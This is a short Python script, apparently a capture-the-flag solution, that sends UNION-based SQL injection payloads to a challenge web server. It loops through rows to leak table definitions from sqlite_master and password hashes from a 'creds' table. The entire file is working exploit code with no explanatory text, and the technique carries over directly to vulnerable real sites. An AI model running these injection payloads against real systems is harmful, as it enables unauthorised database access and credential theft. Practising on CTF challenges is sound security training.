import requests

base = "http://chal1.gryphons.sg:7117/members"
s = requests.Session()
s.headers.update({"User-Agent": "my-script/1.0"})

payload = 'union select sql,null,null,null,null,null from sqlite_master where type="table"' # leak all tables
payload = 'union select password_hash,null,null,null,null,null from creds'                  # leak account info from creds

for i in range(10):
    try:
        res = s.get(base, params={"id": f'''0 {payload} LIMIT 1 OFFSET {i}'''})

        res = res.text
        res = res[res.index("Member ID:"):]
        print(res[:res.index("</div>")])
    except:
        exit()